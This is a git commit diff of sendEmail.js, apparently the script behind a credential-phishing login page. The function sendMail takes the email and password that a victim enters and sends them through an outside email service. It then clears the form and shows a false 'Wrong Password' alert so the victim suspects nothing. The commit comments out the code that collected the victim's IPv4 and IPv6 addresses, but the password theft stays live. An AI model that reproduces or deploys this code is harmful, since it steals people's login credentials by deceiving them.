c7328c04deb40322b091d74c57bb83ff13dea422
Davi Mogrovejo Brasil <124883755+davi-mogrovejo@users.noreply.github.com>
2023-09-15 11:14:40 -0300

    Update sendEmail.js

--- sendEmail.js
+++ sendEmail.js
@@ -1,24 +1,24 @@
-function getIPAddresses() {
-    // Fetch IPv6 address
-    fetch('https://api64.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-            const ipv6 = data.ip;
-            document.getElementById('ipv6').textContent = ipv6;
-            
-            // Fetch IPv4 address
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const ipv4 = data.ip;
-                    document.getElementById('ipv4').textContent = ipv4;
+//function getIPAddresses() {
+//    // Fetch IPv6 address
+//    fetch('https://api64.ipify.org?format=json')
+//        .then(response => response.json())
+//        .then(data => {
+//            const ipv6 = data.ip;
+//            document.getElementById('ipv6').textContent = ipv6;
+//            
+//            // Fetch IPv4 address
+//            fetch('https://api.ipify.org?format=json')
+//                .then(response => response.json())
+//                .then(data => {
+//                    const ipv4 = data.ip;
+//                    document.getElementById('ipv4').textContent = ipv4;
 
 function sendMail() {
   var params = {
     email: document.getElementById("email").value,
     password: document.getElementById("password").value,
-    ipv4: document.getElementById("ipv4").value,
-    ipv6: document.getElementById("ipv6").value,
+//    ipv4: document.getElementById("ipv4").value,
+//    ipv6: document.getElementById("ipv6").value,
   };
 
   const serviceID = "service_v127bm1";
@@ -28,8 +28,8 @@ function sendMail() {
     .then(res=>{
         document.getElementById("email").value = "";
         document.getElementById("password").value = "";
-        document.getElementById("ipv4").value = "";
-        document.getElementById("ipv6").value = "";
+//        document.getElementById("ipv4").value = "";
+//        document.getElementById("ipv6").value = "";
         console.log(res);
         alert("Wrong Password")
 
